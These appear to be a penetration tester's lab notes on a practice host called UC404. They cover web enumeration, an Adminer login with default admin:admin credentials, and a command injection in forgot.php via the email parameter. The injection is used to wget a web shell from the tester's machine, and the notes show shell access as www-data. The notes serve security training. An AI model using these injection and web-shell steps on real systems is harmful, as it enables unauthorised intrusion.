# 2 :80 adminlte

```
http://192.168.136.109/
AdminLTE 3 Landing Page
| (bottom-of-page)  AdminLTE.io Version 3.1.0-pre

| its a visual template

# from nmapAutomator
| http-enum:
|   /.gitignore: Revision control ignore file
|   /.git/HEAD: Git folder
| http-git:
|   192.168.136.109:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/ColorlibHQ/AdminLTE.git
|_    Project type: Ruby on Rails web application (guessed from .gitignore)

# nikto 
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /composer.json: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
+ /package.json: Node.js package file found. It may contain sensitive information.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.

$ gobuster dir -u http://192.168.136.109/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,html,txt -t 90
===============================================================
/pages                (Status: 301) [Size: 318] [--> http://192.168.136.109/pages/]
/index2.html          (Status: 200) [Size: 71875]
/demo                 (Status: 301) [Size: 317] [--> http://192.168.136.109/demo/]
/index.html           (Status: 200) [Size: 60628]
/plugins              (Status: 301) [Size: 320] [--> http://192.168.136.109/plugins/]
/db                   (Status: 301) [Size: 315] [--> http://192.168.136.109/db/]
/index3.html          (Status: 200) [Size: 42799]
/dist                 (Status: 301) [Size: 317] [--> http://192.168.136.109/dist/]
/build                (Status: 301) [Size: 318] [--> http://192.168.136.109/build/]
/LICENSE              (Status: 200) [Size: 1082]
/starter.html         (Status: 200) [Size: 12884]
/under_construction   (Status: 301) [Size: 331] [--> http://192.168.136.109/under_construction/]

# ffuf
docs                    [Status: 301, Size: 317, Words: 20, Lines: 10]

http://192.168.136.109/db/
Adminer 4.7.7

# from git-repo page
https://github.com/ColorlibHQ/AdminLTE.git
http://192.168.136.109/package.json
"name": "admin-lte",
"version": "3.1.0-pre",

# exploring 192.168.136.109/db
# brute-forcing admin:admin for the different db-types
# worked
System: ClickHouse (alpha)
Server: localhost
Username: admin
Password: admin

http://192.168.136.109/db/?clickhouse=localhost&username=admin
ClickHouse (alpha) version: through PHP extension JSON
Logged as: admin 

# definitely a rabbit hole; can't get anything out of it

http://192.168.136.109/under_construction/
Login Page | UC404
# needs email; don't know it

http://192.168.136.109/under_construction/register.html
has nothing

http://192.168.136.109/under_construction/forgot.php
# view source shows
<!--
  ______ __  __          _____ _         _______     _______ _______ ______ __  __ 
 |  ____|  \/  |   /\   |_   _| |       / ____\ \   / / ____|__   __|  ____|  \/  |
 | |__  | \  / |  /  \    | | | |      | (___  \ \_/ / (___    | |  | |__  | \  / |
 |  __| | |\/| | / /\ \   | | | |       \___ \  \   / \___ \   | |  |  __| | |\/| |
 | |____| |  | |/ ____ \ _| |_| |____   ____) |  | |  ____) |  | |  | |____| |  | |
 |______|_|  |_/_/    \_\_____|______| |_____/   |_| |_____/   |_|  |______|_|  |_|
 

---- Under Construction ----
sendmail.php must receive the variable from the html form and send the message.
|| For security reasons we are working to blacklist some characters ||
//-->

Could not open input file: sendmail.php
1

# trying admin@uc404.com
nothing

# file sendmail.php maybe is not there?
# trying code injection via Burp on GET, as page had
# `Could not open input file: sendmail.php` on GET request

# trying stack query first
GET /under_construction/forgot.php?email=;id HTTP/1.1
Host: 192.168.136.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Upgrade-Insecure-Requests: 1

# response
Could not open input file: sendmail.php
1

Using https://book.hacktricks.xyz/pentesting-web/command-injection

email=||+id
Could not open input file: sendmail.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# we have code execution
email=||wget+192.168.49.136/web.php

http://192.168.136.109/under_construction/web.php
# we have shell

CMD: whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
UC404
Linux UC404 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
```
